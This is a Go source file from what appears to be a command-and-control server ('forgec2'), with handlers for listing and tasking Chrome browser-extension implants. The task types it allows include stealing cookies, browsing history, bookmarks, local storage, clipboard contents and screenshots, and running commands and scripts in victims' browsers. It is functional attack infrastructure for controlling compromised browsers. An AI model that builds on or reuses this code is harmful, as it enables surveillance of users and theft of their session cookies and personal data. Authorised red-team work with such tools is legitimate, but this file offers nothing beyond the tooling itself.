package server

import (
	"net/http"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/pkg/protocol"
	"github.com/gin-gonic/gin"
)

var chromeTaskTypes = map[string]bool{
	protocol.TaskTypeChromeC2:         true,
	protocol.TaskTypeChromeExec:       true,
	protocol.TaskTypeChromeScript:     true,
	protocol.TaskTypeChromeCookies:    true,
	protocol.TaskTypeChromeBookmarks:  true,
	protocol.TaskTypeChromeHistory:    true,
	protocol.TaskTypeChromeTabs:       true,
	protocol.TaskTypeChromeDownload:   true,
	protocol.TaskTypeChromeStorage:    true,
	protocol.TaskTypeChromeScreenshot: true,
	protocol.TaskTypeChromeClipboard:  true,
	protocol.TaskTypeChromeIdle:       true,
}

// chromeAgent is the JSON shape expected by the Chrome C2 frontend page.
type chromeAgent struct {
	UUID     string `json:"uuid"`
	Hostname string `json:"hostname"`
	Platform string `json:"platform"`
	Language string `json:"language"`
	Browser  string `json:"browser"`
	LastSeen string `json:"last_seen"`
	Status   string `json:"status"`
}

// handleChromeAgents returns the list of Chrome (browser extension) C2 agents.
// Browser-extension agents are tracked as implants tagged "chrome"; if none
// exist we return an empty list so the UI renders its "no agents" state.
func (s *Server) handleChromeAgents(c *gin.Context) {
	var agents []db.Implant
	if err := s.db.Where("tags LIKE ?", "%chrome%").Order("last_seen desc").Limit(500).Find(&agents).Error; err != nil {
		respondError(c, http.StatusInternalServerError, "database error")
		return
	}

	out := make([]chromeAgent, 0, len(agents))
	for _, a := range agents {
		lastSeen := ""
		if !a.LastSeen.IsZero() {
			lastSeen = a.LastSeen.Format(time.RFC3339)
		}
		out = append(out, chromeAgent{
			UUID:     a.ID,
			Hostname: a.Hostname,
			Platform: a.OS,
			Language: "",
			Browser:  "Chrome",
			LastSeen: lastSeen,
			Status:   a.Status,
		})
	}

	respond(c, gin.H{"agents": out})
}

// handleChromeAgentTask dispatches a task to a Chrome extension agent.
func (s *Server) handleChromeAgentTask(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	uuid := c.Param("uuid")

	var req struct {
		Type    string `json:"type"`
		Command string `json:"command"`
		Path    string `json:"path"`
		Data    string `json:"data"`
		Details string `json:"details"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}

	var agent db.Implant
	if !s.findOrFail(c, &agent, uuid, "agent") {
		return
	}

	taskType := req.Type
	if taskType == "" {
		taskType = "chrome_exec"
	}

	if !chromeTaskTypes[taskType] {
		respondError(c, http.StatusBadRequest, "invalid chrome task type: "+taskType)
		return
	}

	task, err := s.createTask(uuid, taskType, req.Command, "", req.Path, req.Data, 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "task creation failed")
		return
	}

	s.broadcastTaskUpdate(uuid, *task)
	respond(c, gin.H{"success": true, "task_id": task.ID})
}
